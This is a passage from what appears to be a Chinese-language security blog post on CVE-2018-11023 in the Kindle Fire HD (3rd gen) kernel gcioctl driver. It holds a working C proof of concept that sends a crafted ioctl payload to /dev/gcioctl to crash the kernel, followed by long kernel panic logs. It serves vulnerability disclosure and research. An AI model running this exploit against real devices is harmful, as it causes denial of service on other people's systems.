00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  145.150848] </span><br><span class="line">[  145.150848] R9: 0xd8c0cc28:</span><br><span class="line">[  145.155944] cc28  d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  145.166503] cc48  00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  145.177062] cc68  5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000</span><br><span class="line">[  145.187713] cc88  00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000</span><br><span class="line">[  145.198394] cca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[  145.208923] ccc8  d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b</span><br><span class="line">[  145.219573] cce8  2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  145.230255] cd08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24</span><br><span class="line">[  145.240936] Process executor32 (pid: 3810, stack limit &#x3D; 0xc2d6a2f8)</span><br><span class="line">[  145.248016] Stack: (0xc2d6be38 to 0xc2d6c000)</span><br><span class="line">[  145.253082] be20:                                                       c02ba53c 575b4b92</span><br><span class="line">[  145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000</span><br><span class="line">[  145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001</span><br><span class="line">[  145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8</span><br><span class="line">[  145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000</span><br><span class="line">[  145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000</span><br><span class="line">[  145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08</span><br><span class="line">[  145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b</span><br><span class="line">[  145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b</span><br><span class="line">[  145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8</span><br><span class="line">[  145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90</span><br><span class="line">[  145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4</span><br><span class="line">[  145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430</span><br><span class="line">[  145.390686] Backtrace: </span><br><span class="line">[  145.393829] [&lt;c031877c&gt;] (c2dm_l1cache+0x0&#x2F;0x100) from [&lt;c031782c&gt;] (dev_ioctl+0x3f0&#x2F;0x10c4)</span><br><span class="line">[  145.403228] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  145.412658] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  145.421874] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  145.431304]  r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80</span><br><span class="line">[  145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) </span><br><span class="line">[  145.450225] Board Information: </span><br><span class="line">[  145.450225]  Revision : 0001</span><br><span class="line">[  145.450256]  Serial	: 0000000000000000</span><br><span class="line">[  145.450256] SoC Information:</span><br><span class="line">[  145.450256]  CPU	: OMAP4470</span><br><span class="line">[  145.450286]  Rev	: ES1.0</span><br><span class="line">[  145.450286]  Type	: HS</span><br><span class="line">[  145.450286]  Production ID: 0002B975-000000CC</span><br><span class="line">[  145.450286]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  145.450317] </span><br><span class="line">[  145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]---</span><br><span class="line">[  145.491149] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  145.496917] CPU1: stopping</span><br><span class="line">[  145.500152] Backtrace: </span><br><span class="line">[  145.503204] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  145.512695]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[  145.519714] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  145.528961] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  145.538482] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40&#x2F;0x60)</span><br><span class="line">[  145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8)</span><br><span class="line">[  145.553466] 5fa0:                                     41822290 418185e8 00000001 41c95000</span><br><span class="line">[  145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec</span><br><span class="line">[  145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff</span><br><span class="line">[  145.579284]  r6:ffffffff r5:200b0010 r4:41609974 r3:41822290</span><br><span class="line">[  145.586364] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[  145.590576] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[  145.594635] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[  145.598693] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[  145.602722] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[  145.606781] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[  145.610839] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[  145.614898] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[  145.619110] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[  145.623168] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[  145.627227] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[  145.631408] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[  145.635467] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[  145.639495] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[  145.643707] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[  145.647766] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[  145.651824] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[  145.656005] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[  145.660064] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[  145.664123] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[  145.668182] </span><br><span class="line">[  145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  145.669982] </span><br></pre></td></tr></table></figure></blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-09-12T15:12:52.000Z" title="2020-09-12T15:12:52.000Z">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-09-12T15:19:13.464Z" title="2020-09-12T15:19:13.464Z">2020-09-12</time></span><span class="level-item"><a class="link-muted" href="/categories/IOT/">IOT</a></span><span class="level-item">12 minutes read (About 1807 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11023%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">（CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><hr>
<blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令3222560159，并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. </span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/gcioctl.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/gcioctl&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3222560159</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123; <span class="number">0x244085aa</span>, <span class="number">0x1a03e6ef</span>, <span class="number">0x000003f4</span>, <span class="number">0x00000000</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        fd = open(driver, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">[   79.825592] init: untracked pid 3232 exited</span><br><span class="line">[   79.830841] init: untracked pid 3234 exited</span><br><span class="line">[   95.970855] Alignment trap: not handling instruction e1953f9f at [&lt;c06a4d84&gt;]</span><br><span class="line">[   95.978912] Unhandled fault: alignment exception (0x001) at 0x1a03e6f3</span><br><span class="line">[   95.986053] Internal error: : 1 [#1] PREEMPT SMP ARM</span><br><span class="line">[   95.991638] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[   95.999145] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[   96.006408] PC is at __raw_spin_lock_irqsave+0x38&#x2F;0xb0</span><br><span class="line">[   96.012115] LR is at _raw_spin_lock_irqsave+0x10&#x2F;0x14</span><br><span class="line">[   96.017791] pc : [&lt;c06a4d88&gt;]    lr : [&lt;c06a4e10&gt;]    psr: 20000093</span><br><span class="line">[   96.017822] sp : d02bfdd8  ip : d02bfdf8  fp : d02bfdf4</span><br><span class="line">[   96.030578] r10: 00000000  r9 : dd3eeca8  r8 : 00000001</span><br><span class="line">[   96.036376] r7 : 1a03e6ef  r6 : 00000001  r5 : 1a03e6f3  r4 : d02be000</span><br><span class="line">[   96.043701] r3 : 00000001  r2 : 00000001  r1 : 00000082  r0 : 20000013</span><br><span class="line">[   96.050933] Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[   96.058990] Control: 10c5387d  Table: 96cb804a  DAC: 00000015</span><br><span class="line">[   96.065460] </span><br><span class="line">[   96.065460] PC: 0xc06a4d08:</span><br><span class="line">[   96.070404] 4d08  1a000003 eaffffe6 e5903000 e3530000 0affffe3 e5903004 e3530000 1afffff9</span><br><span class="line">[   96.080810] 4d28  eaffffdf e50b0018 ebfffbab e51b0018 eaffffed e1a0c00d e92dd800 e24cb004</span><br><span class="line">[   96.091217] 4d48  ebffffcf e89da800 e1a0c00d e92dd878 e24cb004 e1a0300d e3c34d7f e3c4403f</span><br><span class="line">[   96.101776] 4d68  e1a05000 e3a06001 e5943004 e2833001 e5843004 e10f0000 f10c0080 e1953f9f</span><br><span class="line">[   96.112335] 4d88  e3330000 01853f96 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004</span><br><span class="line">[   96.122894] 4da8  e5943000 e3130002 1a000010 e5953004 e3530000 e5953000 05856004 e3530000</span><br><span class="line">[   96.133361] 4dc8  1a000003 eaffffe7 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9</span><br><span class="line">[   96.143920] 4de8  eaffffe0 f57ff05f e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800</span><br><span class="line">[   96.154479] </span><br><span class="line">[   96.154479] LR: 0xc06a4d90:</span><br><span class="line">[   96.159393] 4d90  e3530000 0a000014 e121f000 e5943004 e2433001 e5843004 e5943000 e3130002</span><br><span class="line">[   96.170013] 4db0  1a000010 e5953004 e3530000 e5953000 05856004 e3530000 1a000003 eaffffe7</span><br><span class="line">[   96.180603] 4dd0  e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9 eaffffe0 f57ff05f</span><br><span class="line">[   96.191070] 4df0  e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800 e24cb004 ebffffcf</span><br><span class="line">[   96.201690] 4e10  e89da800 e1a0c00d e92dd800 e24cb004 ebfffff6 e89da800 e1a0c00d e92dd800</span><br><span class="line">[   96.212341] 4e30  e24cb004 ebfffff1 e89da800 e1a0c00d e92dd818 e24cb004 ebffffc0 e1a04000</span><br><span class="line">[   96.222808] 4e50  ebe6a978 e121f004 e89da818 e1a0c00d e92dd800 e24cb004 ebfffff3 e89da800</span><br><span class="line">[   96.233612] 4e70  e1a0c00d e92dd830 e24cb004 e24dd008 e1a0300d e3c34d7f e3c4403f e3a05001</span><br><span class="line">[   96.244262] </span><br><span class="line">[   96.244262] SP: 0xd02bfd58:</span><br><span class="line">[   96.249145] fd58  00000000 0000001d 00000004 d4736f80 d4737394 c06a4d84 20000093 ffffffff</span><br><span class="line">[   96.259948] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082</span><br><span class="line">[   96.270660] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8</span><br><span class="line">[   96.281311] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff</span><br><span class="line">[   96.292053] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c</span><br><span class="line">[   96.302825] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20</span><br><span class="line">[   96.313415] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef</span><br><span class="line">[   96.323883] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60</span><br><span class="line">[   96.334533] </span><br><span class="line">[   96.334533] IP: 0xd02bfd78:</span><br><span class="line">[   96.339416] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082</span><br><span class="line">[   96.349853] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8</span><br><span class="line">[   96.360290] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff</span><br><span class="line">[   96.370727] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c</span><br><span class="line">[   96.381042] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20</span><br><span class="line">[   96.391479] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef</span><br><span class="line">[   96.402008] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60</span><br><span class="line">[   96.412445] fe58  c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028</span><br><span class="line">[   96.422790] </span><br><span class="line">[   96.422790] FP: 0xd02bfd74:</span><br><span class="line">[   96.427795] fd74  ffffffff d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013</span><br><span class="line">[   96.438140] fd94  00000082 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001</span><br><span class="line">[   96.448699] fdb4  dd3eeca8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093</span><br><span class="line">[   96.459289] fdd4  ffffffff 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10</span><br><span class="line">[   96.470031] fdf4  c06a4d5c d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008</span><br><span class="line">[   96.480438] fe14  c06a4e20 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54</span><br><span class="line">[   96.490875] fe34  1a03e6ef bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c</span><br><span class="line">[   96.501495] fe54  d02bfe60 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001</span><br><span class="line">[   96.512023] </span><br><span class="line">[   96.512023] R4: 0xd02bdf80:</span><br><span class="line">[   96.517089] df80  000003ef 61ef22a8 61ef2278 61ef22d8 00000036 c0013e08 00000000 d02bdfa8</span><br><span class="line">[   96.527679] dfa0  c0013c60 c0136578 61ef22a8 61ef2278 0000000a c0186201 65490ce8 65490ce0</span><br><span class="line">[   96.538208] dfc0  61ef22a8 61ef2278 61ef22d8 00000036 00000001 65393000 6253ab8c 4010f2ec</span><br><span class="line">[   96.548797] dfe0  00000001 65490cd0 400f0273 400e3804 600f0010 0000000a 5788f1b0 0000000b</span><br><span class="line">[   96.559356] e000  00000002 00000003 00000000 d4736f80 c0a0e840 00000000 00000015 c4fcf880</span><br><span class="line">[   96.569885] e020  00000000 d02be000 c09ddc50 d4736f80 dd0be600 c1617b40 d02bfdf4 d02bfd40</span><br><span class="line">[   96.580535] e040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[   96.591125] e060  005bc4c0 5ebfea7f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[   96.601684] </span><br><span class="line">[   96.601684] R9: 0xdd3eec28:</span><br><span class="line">[   96.606628] ec28  dd3eec28 dd3eec28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[   96.617218] ec48  00000000 00000000 dd3eec50 dd3eec50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[   96.627716] ec68  5aefd4d7 00000000 00000000 00000000 dd3eec80 00000000 00000000 00000000</span><br><span class="line">[   96.638275] ec88  00200000 00000000 00000000 dd3eec94 dd3eec94 dd3d6fc0 dd3d6fc0 00000000</span><br><span class="line">[   96.648864] eca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[   96.659423] ecc8  dd3eed80 dd33ae70 00001064 00000001 0fb00000 5aefd4d7 2d2b4d15 5aefd4d7</span><br><span class="line">[   96.669921] ece8  2d2b4d15 5aefd4d7 2d2b4d15 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[   96.680572] ed08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3eed24</span><br><span class="line">[   96.691162] Process gcioctl_poc_3 (pid: 3395, stack limit &#x3D; 0xd02be2f8)</span><br><span class="line">[   96.698455] Stack: (0xd02bfdd8 to 0xd02c0000)</span><br><span class="line">[   96.703430] fdc0:                                                       0000020a 00000082</span><br><span class="line">[   96.712554] fde0: 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c d02bfe14 d02bfe08</span><br><span class="line">[   96.721588] fe00: c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 d84a38d8 d84a2800</span><br><span class="line">[   96.730743] fe20: d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef bed24608 d02be000</span><br><span class="line">[   96.739837] fe40: d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 c06a319c c06a2fec</span><br><span class="line">[   96.748840] fe60: d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028 000fffff d02bfea0</span><br><span class="line">[   96.757934] fe80: d02bfedc d02bfe90 c0207454 c00bd920 0000001e c33a3180 d02bfed4 d02bfea8</span><br><span class="line">[   96.767059] fea0: 244085aa 1a03e6ef 000003f4 00000000 00000000 00000001 00000000 d02bff14</span><br><span class="line">[   96.776214] fec0: 00000000 00000001 dd3eeca8 c24d8a00 d02bfefc d02bfee0 c02089fc 00000000</span><br><span class="line">[   96.785247] fee0: d627f000 00000004 d627f000 bed24608 dd3eeca8 00000000 d02bff74 d02bff08</span><br><span class="line">[   96.794403] ff00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[   96.803649] ff20: dcf8c770 d02bff0c d02be000 bed24638 bed24608 c0145d9f d627f000 00000004</span><br><span class="line">[   96.812744] ff40: d02be000 00000000 d02bff64 00000000 bed24608 c0145d9f d627f000 00000004</span><br><span class="line">[   96.821746] ff60: d02be000 00000000 d02bffa4 d02bff78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[   96.830932] ff80: 00000400 bed24638 00010e54 00000000 00000036 c0013e08 00000000 d02bffa8</span><br><span class="line">[   96.840118] ffa0: c0013c60 c0136578 bed24638 00010e54 00000004 c0145d9f bed24608 bed24608</span><br><span class="line">[   96.849121] ffc0: bed24638 00010e54 00000000 00000036 00000000 00000000 00000000 bed24624</span><br><span class="line">[   96.858245] ffe0: 00000000 bed245ec 00010690 0002917c 60000010 00000004 